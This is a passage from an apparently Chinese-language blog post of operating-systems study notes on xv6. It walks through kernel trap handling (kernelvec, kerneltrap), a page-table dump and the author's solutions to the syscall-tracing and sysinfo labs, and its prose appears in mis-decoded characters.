(<span class="keyword">char</span> *) (pa0 + (srcva - va0));</span><br><span class="line">    <span class="keyword">while</span>(n &gt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(*p == <span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        got_null = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *dst = *p;</span><br><span class="line">      &#125;</span><br><span class="line">      --n;</span><br><span class="line">      --max;</span><br><span class="line">      p++;</span><br><span class="line">      dst++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srcva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(got_null)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡åœ¨qemuä¸‹æ‰“å°é¡µè¡¨å‘ç°ä¼¼ä¹å°±æ˜¯è¿™æ ·çš„,æ˜ å°„äº†ä¸ªå¯‚å¯ğŸ¤¦â€â™€ï¸ï¼Œåœ¨linuxç³»ç»Ÿä¸­å†…æ ¸å¥½æ­¹æ˜¯çº¿æ€§æ˜ å°„æ‰€æœ‰ç‰©ç†åŒºåŸŸï¼Œxv6ç›´æ¥ä¸€å¯¹ä¸€äº†ã€‚</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">vaddr            paddr            size             attr</span><br><span class="line">---------------- ---------------- ---------------- -------</span><br><span class="line">0000000002000000 0000000002000000 0000000000010000 rw-----</span><br><span class="line">000000000c000000 000000000c000000 0000000000001000 rw---ad</span><br><span class="line">000000000c001000 000000000c001000 0000000000001000 rw-----</span><br><span class="line">000000000c002000 000000000c002000 0000000000001000 rw---ad</span><br><span class="line">000000000c003000 000000000c003000 00000000001fe000 rw-----</span><br><span class="line">000000000c201000 000000000c201000 0000000000001000 rw---ad</span><br><span class="line">000000000c202000 000000000c202000 0000000000001000 rw-----</span><br><span class="line">000000000c203000 000000000c203000 0000000000001000 rw---ad</span><br><span class="line">000000000c204000 000000000c204000 0000000000001000 rw-----</span><br><span class="line">000000000c205000 000000000c205000 0000000000001000 rw---ad</span><br><span class="line">000000000c206000 000000000c206000 00000000001fa000 rw-----</span><br><span class="line">0000000010000000 0000000010000000 0000000000002000 rw---ad</span><br><span class="line">0000000080000000 0000000080000000 0000000000007000 r-x--a-</span><br><span class="line">0000000080007000 0000000080007000 0000000000001000 r-x----</span><br><span class="line">0000000080008000 0000000080008000 0000000000005000 rw---ad</span><br><span class="line">000000008000d000 000000008000d000 0000000000004000 rw-----</span><br><span class="line">0000000080011000 0000000080011000 0000000000011000 rw---ad</span><br><span class="line">0000000080022000 0000000080022000 0000000000001000 rw-----</span><br><span class="line">0000000080023000 0000000080023000 0000000000003000 rw---ad</span><br><span class="line">0000000080026000 0000000080026000 0000000007f35000 rw-----</span><br><span class="line">0000000087f5b000 0000000087f5b000 000000000005d000 rw---ad</span><br><span class="line">0000000087fb8000 0000000087fb8000 0000000000001000 rw---a-</span><br><span class="line">0000000087fb9000 0000000087fb9000 0000000000046000 rw-----</span><br><span class="line">0000000087fff000 0000000087fff000 0000000000001000 rw---a-</span><br><span class="line">0000003ffff7f000 0000000087f77000 000000000003e000 rw-----</span><br><span class="line">0000003fffffb000 0000000087fb5000 0000000000002000 rw---ad</span><br><span class="line">0000003ffffff000 0000000080007000 0000000000001000 r-x--a-</span><br></pre></td></tr></table></figure>

<h5 id="ä»å†…æ ¸æ€é™·å…¥"><a href="#ä»å†…æ ¸æ€é™·å…¥" class="headerlink" title="ä»å†…æ ¸æ€é™·å…¥"></a>ä»å†…æ ¸æ€é™·å…¥</h5><p>ä¹¦ä¸­æ¶‰åŠåˆ°äº†è®¡æ•°å™¨ä¸­æ–­çš„å¤„ç†åŠæ³•ï¼Œç”±äºæˆ‘ä¸æ˜¯å¾ˆç†Ÿæ‚‰è®¡æ•°å™¨ä¸­æ–­ï¼Œæ‰€ä»¥æš‚ä¸”ä¸è®¨è®ºè¿™ç§æƒ…å†µï¼Œåœ¨ç¬¬ä¸ƒç« ä¸­ä¼šç³»ç»Ÿçš„å­¦åˆ°ã€‚æˆ‘åªè®¨è®ºä¸€èˆ¬æƒ…å†µä¸‹çš„å†…æ ¸é™·å…¥ã€‚</p>
<p>å†…æ ¸å‘ç”Ÿé™·å…¥çš„è¯åªæœ‰ä¸¤ç§æƒ…å†µï¼Œä¸€æ˜¯è®¾å¤‡ä¸­æ–­ï¼ŒäºŒæ˜¯å†…æ ¸å¼‚å¸¸ï¼Œæ­¤æ—¶æ˜¯å¤„äºå†…æ ¸æ€çš„ï¼Œ<code>stvec</code>å°±æŒ‡å‘äº†<code>kernelvec</code>,ç„¶åå¤„ç†trapä¹Ÿæ˜¯åœ¨å†…æ ¸æ€ï¼Œæ‰€ä»¥ä¸éœ€è¦åˆ‡æ¢é¡µè¡¨äº†ã€‚å¤„ç†æµç¨‹ä¸»è¦æ˜¯ä¸¤ä¸ªå‡½æ•°ï¼š<code>kernelvec</code>-&gt;<code>kerneltrap</code>-&gt;<code>kernelvec</code></p>
<p><strong>kernelvec</strong></p>
<p>æ„æ–™ä¹‹ä¸­åˆæ˜¯risc-væ±‡ç¼–æï¼Œä½†æ˜¯å¤§æ¦‚æ˜¯èƒ½çœ‹æ‡‚çš„ï¼Œkernelvecé¦–å…ˆå¾—æŠŠæ‰€æœ‰çš„å¯„å­˜å™¨å­˜æ”¾åˆ°å½“å‰å†…æ ¸æ ˆçš„æ ˆä¸Šï¼Œæ‰€ä»¥é¦–å…ˆ<code>addi sp.sp,-256</code>å°±æ˜¯<code>sp=sp+(-256)</code>ï¼Œå…ˆæå‡æ ˆçš„å®¹é‡ã€‚ç„¶åæŠŠå¯„å­˜å™¨æ”¾åœ¨è¿™256å®¹é‡çš„æ ˆé‡Œï¼Œ<code>sd ra,0(sp)</code>ç­‰äº<code>*[sp+0]=ra</code>è¿™æ ·çš„å½¢å¼å­˜å‚¨ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦å­˜å‚¨æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œæ˜¯å› ä¸ºåœ¨è°ƒç”¨<code>kerneltrap</code>çš„æ—¶å€™ï¼Œä¼šå› ä¸ºæ—¶é’Ÿä¸­æ–­è€Œè®©å‡ºcpuå¯¼è‡´ä¸¢å¤±å¯„å­˜å™¨ä¿¡æ¯ï¼Œæ‰€ä»¥å¾—è®°å½•ä¸€ä¸‹ï¼Œè®°å½•å®Œå°±æ˜¯è°ƒç”¨<code>kerneltrap</code>äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">        # interrupts and exceptions while in supervisor</span><br><span class="line">        # mode come here.</span><br><span class="line">        #</span><br><span class="line">        # push all registers, call kerneltrap(), restore, return.</span><br><span class="line">        #</span><br><span class="line">.globl kerneltrap</span><br><span class="line">.globl kernelvec</span><br><span class="line">.align 4</span><br><span class="line">kernelvec:</span><br><span class="line">        // make room to save registers.</span><br><span class="line">        addi sp, sp, -256</span><br><span class="line"></span><br><span class="line">        // save the registers.</span><br><span class="line">        sd ra, 0(sp)</span><br><span class="line">        sd sp, 8(sp)</span><br><span class="line">        sd gp, 16(sp)</span><br><span class="line">        sd tp, 24(sp)</span><br><span class="line">        sd t0, 32(sp)</span><br><span class="line">        sd t1, 40(sp)</span><br><span class="line">        sd t2, 48(sp)</span><br><span class="line">        sd s0, 56(sp)</span><br><span class="line">        sd s1, 64(sp)</span><br><span class="line">        sd a0, 72(sp)</span><br><span class="line">        sd a1, 80(sp)</span><br><span class="line">        sd a2, 88(sp)</span><br><span class="line">        sd a3, 96(sp)</span><br><span class="line">        sd a4, 104(sp)</span><br><span class="line">        sd a5, 112(sp)</span><br><span class="line">        sd a6, 120(sp)</span><br><span class="line">        sd a7, 128(sp)</span><br><span class="line">        sd s2, 136(sp)</span><br><span class="line">        sd s3, 144(sp)</span><br><span class="line">        sd s4, 152(sp)</span><br><span class="line">        sd s5, 160(sp)</span><br><span class="line">        sd s6, 168(sp)</span><br><span class="line">        sd s7, 176(sp)</span><br><span class="line">        sd s8, 184(sp)</span><br><span class="line">        sd s9, 192(sp)</span><br><span class="line">        sd s10, 200(sp)</span><br><span class="line">        sd s11, 208(sp)</span><br><span class="line">        sd t3, 216(sp)</span><br><span class="line">        sd t4, 224(sp)</span><br><span class="line">        sd t5, 232(sp)</span><br><span class="line">        sd t6, 240(sp)</span><br><span class="line"></span><br><span class="line">	// call the C trap handler in trap.c</span><br><span class="line">        call kerneltrap</span><br><span class="line"></span><br><span class="line">        // restore registers.</span><br><span class="line">        ld ra, 0(sp)</span><br><span class="line">        ld sp, 8(sp)</span><br><span class="line">        ld gp, 16(sp)</span><br><span class="line">        // not this, in case we moved CPUs: ld tp, 24(sp)</span><br><span class="line">        ld t0, 32(sp)</span><br><span class="line">        ld t1, 40(sp)</span><br><span class="line">        ld t2, 48(sp)</span><br><span class="line">        ld s0, 56(sp)</span><br><span class="line">        ld s1, 64(sp)</span><br><span class="line">        ld a0, 72(sp)</span><br><span class="line">        ld a1, 80(sp)</span><br><span class="line">        ld a2, 88(sp)</span><br><span class="line">        ld a3, 96(sp)</span><br><span class="line">        ld a4, 104(sp)</span><br><span class="line">        ld a5, 112(sp)</span><br><span class="line">        ld a6, 120(sp)</span><br><span class="line">        ld a7, 128(sp)</span><br><span class="line">        ld s2, 136(sp)</span><br><span class="line">        ld s3, 144(sp)</span><br><span class="line">        ld s4, 152(sp)</span><br><span class="line">        ld s5, 160(sp)</span><br><span class="line">        ld s6, 168(sp)</span><br><span class="line">        ld s7, 176(sp)</span><br><span class="line">        ld s8, 184(sp)</span><br><span class="line">        ld s9, 192(sp)</span><br><span class="line">        ld s10, 200(sp)</span><br><span class="line">        ld s11, 208(sp)</span><br><span class="line">        ld t3, 216(sp)</span><br><span class="line">        ld t4, 224(sp)</span><br><span class="line">        ld t5, 232(sp)</span><br><span class="line">        ld t6, 240(sp)</span><br><span class="line"></span><br><span class="line">        addi sp, sp, 256</span><br><span class="line"></span><br><span class="line">        // return to whatever we were doing in the kernel.</span><br><span class="line">        sret</span><br></pre></td></tr></table></figure>

<p><strong>kerneltrap</strong></p>
<p>é¦–å…ˆæ˜¯å‚¨å­˜<code>sepc</code>å’Œ<code>sstatus</code>ä¸¤ä¸ªå¯„å­˜å™¨ï¼Œå› ä¸ºå¦‚æœæœ‰æ—¶é’Ÿä¸­æ–­è€Œè°ƒç”¨<code>yield()</code>å‡½æ•°çš„æ—¶å€™ä¼šç ´åä»–ä»¬ï¼Œè¦ä½¿ç ´åäº†ä»–ä»¬trapè¿”å›çš„æ—¶å€™å°±ä¼šå‡ºé—®é¢˜ï¼Œä¿å­˜å®ŒåçœŸæ­£å¤„ç†trapï¼Œå¤„ç†å®Œä¹‹åæ¢å¤<code>sepc</code>å’Œ<code>sstatus</code>ï¼Œç„¶åè¿”å›åˆ°å‡½æ•°<code>kernelvec</code>ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">  uint64 sepc = r_sepc();</span><br><span class="line">  uint64 sstatus = r_sstatus();</span><br><span class="line">  uint64 scause = r_scause();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(intr_get() != <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((which_dev = devintr()) == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">    panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">    yield();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line">  <span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">  w_sepc(sepc);</span><br><span class="line">  w_sstatus(sstatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿”å›åˆ°kernelvecä¸­å°±ä¼šç®€å•äº†ï¼Œå°±åˆ©ç”¨æ ˆä¿¡æ¯æ¢å¤é€šç”¨å¯„å­˜å™¨ï¼Œç„¶å<code>addi sp, sp, 256</code>å<code>sret</code>ç»“æŸå†…æ ¸é™·å…¥ã€‚</p>
<p>æ€»è€Œè¨€ä¹‹æ¯”ç”¨æˆ·æ€é™·å…¥è¦ç®€å•å¾ˆå¤šäº†ã€‚</p>
<h5 id="é¡µé¢é”™è¯¯å¼‚å¸¸"><a href="#é¡µé¢é”™è¯¯å¼‚å¸¸" class="headerlink" title="é¡µé¢é”™è¯¯å¼‚å¸¸"></a>é¡µé¢é”™è¯¯å¼‚å¸¸</h5><p>è¿™ä¸ªæš‚æ—¶ä¸çœ‹ï¼Œæ¶‰åŠåˆ°äº†ç¬¬ä¸‰ç« çš„çŸ¥è¯†ï¼Œæš‚æ—¶è¿˜æ²¡æœ‰å­¦ä¹ åˆ°ã€‚</p>
<h4 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h4><p>å°±æ˜¯å¢åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¿½è¸ªçš„åŠŸèƒ½ï¼Œå¯ä»¥å…ˆåˆ©ç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨è®¾ç½®è‡ªå·±æƒ³è¦è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶åè¿™ä¸ªç¨‹åºä»¥åŠå­ç¨‹åºåœ¨è°ƒç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™éƒ½ä¼šæ‰“å°ç›¸åº”æ•°æ®ã€‚</p>
<p>ç¼–ç¨‹ä¸æ˜¯éš¾ç‚¹ï¼Œéš¾ç‚¹å¯èƒ½æ˜¯ç†æ¸…æ¥šç³»ç»Ÿè°ƒç”¨çš„åŸç†ä»¥åŠå¯¹åº”çš„å‡ ä¸ªcæ–‡ä»¶å°±å¥½äº†ï¼Œåªè¦é˜…è¯»è¿‡ä¹¦ç±çš„ç¬¬å››ç« é—®é¢˜å°±ä¸å¤§çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trace_printf_sysname</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> mask=p-&gt;trace_num;</span><br><span class="line">  <span class="keyword">int</span> sys_num=p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(mask&amp;(<span class="number">1</span>&lt;&lt;sys_num))&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[sys_num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_trace</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> mask;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>,&amp;mask)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  p-&gt;trace_num=mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h4><p>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ä¸ªå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œé¦–å…ˆå¾—æŠŠç»“æ„ä½“ä»<code>struct sysinfo</code>ä»å†…æ ¸æ€æ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œç„¶åå¾—åœ¨å†…æ ¸è·å¾—ç©ºé—²å†…å­˜é‡ï¼Œç„¶åè¿˜å¾—è·å¾—<code>stat</code>ä¸ä¸º<code>UNUSED</code>çš„è¿›ç¨‹æ•°ã€‚éƒ½æ²¡æ€ä¹ˆå¬è¿‡ï¼Œå¾—é˜…è¯»æºç æ…¢æ…¢ææ¸…æ¥šã€‚</p>
<p>ä»å†…æ ¸æ€æ‹·è´æ•°æ®ä½¿ç”¨çš„æ˜¯<code>copyout</code>å‡½æ•°,ä¹‹å‰åˆ†æè¿‡<code>copyin</code>å‡½æ•°ï¼ŒåŸç†éƒ½æ˜¯å·®ä¸å¤šçš„ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">copyout</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è·å¾—å†…å­˜ç©ºé—²å­—èŠ‚è¯¾ä»¥é€šè¿‡é˜…è¯»<code>kmalloc.c</code>æºç å¾ˆå¥½çš„è§£å†³,åœ¨xv6ç³»ç»Ÿä¸­å®šä¹‰äº†ä¸¤ä¸ªç»“æ„ä½“æ¥ç®¡ç†ç©ºé—²é¡µé¢å…¶ä¸­é€šè¿‡<code>struct run</code>ç»„æˆä¸€ä¸ªå•å‘é“¾è¡¨æ¥é“¾æ¥æ‰€æœ‰çš„ç©ºé—²é“¾è¡¨ï¼Œç„¶åé€šè¿‡<code>struct kmem.freelist</code>æŒ‡å‘è¿™ä¸ªé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œæ‰€ä»¥åªéœ€è¦éå†è¿™ä¸ªé“¾è¡¨å°±å¯ä»¥æ‰€æœ‰ç©ºé—²é¡µé¢äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">run</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">&#125; kmem;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>struct proc</code>ä¸­æœ‰ä¸€ä¸ªå­—æ®µ<code>struct proc *parent</code>å¯ä»¥é€šè¿‡éå†è¿™ä¸ªå­—æ®µå®Œæˆå¯¹è¿›ç¨‹æ•°çš„ç»Ÿè®¡ï¼Œè¿™ç§ç»Ÿè®¡æ–¹å¼è‚¯å®šæœ‰é—®é¢˜ï¼Œå› ä¸ºä¸€ä¸ªè¿›ç¨‹å¯ä»¥æœ‰å¤šä¸ªå­è¿›ç¨‹ï¼Œè¿™ä¸ªåŠæ³•æ¯ä¸€å±‚è¿›ç¨‹åªèƒ½éå†ä¸€ä¸ªï¼Œä¸å…¶è¯´ç»Ÿè®¡æœ‰å¤šå°‘ä¸ªè¿›ç¨‹ï¼Œä¸å¦‚è¯´ç»Ÿè®¡æœ‰å¤šå°‘å±‚è¿›ç¨‹ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯<code>struct proc</code>çš„è®¾è®¡é—®é¢˜ï¼Œåªèƒ½è¿™æ ·å¹²ã€‚</p>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">uint64</span></span><br><span class="line"><span class="function"><span class="title">sys_sysinfo</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line">  uint64 user_info;</span><br><span class="line">  <span class="keyword">if</span>(argaddr(<span class="number">0</span>,&amp;user_info)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sysinfo addr get fail\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  info.freemem=countfree();</span><br><span class="line">  info.nproc=get_proc_num();</span><br><span class="line">  <span class="keyword">if</span>(copyout(p-&gt;pagetable,user_info,(<span class="keyword">char</span> *)&amp;info,<span class="keyword">sizeof</span>(info))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> </span></span><br><span class="line"><span class="function"><span class="title">countfree</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n=<span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  r=kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;page_addr:%p\n&quot;,r);</span></span><br><span class="line">    n=n+<span class="number">4096</span>;</span><br><span class="line">    r=r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_proc_num</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>=</span>myproc();</span><br><span class="line">  <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">  <span 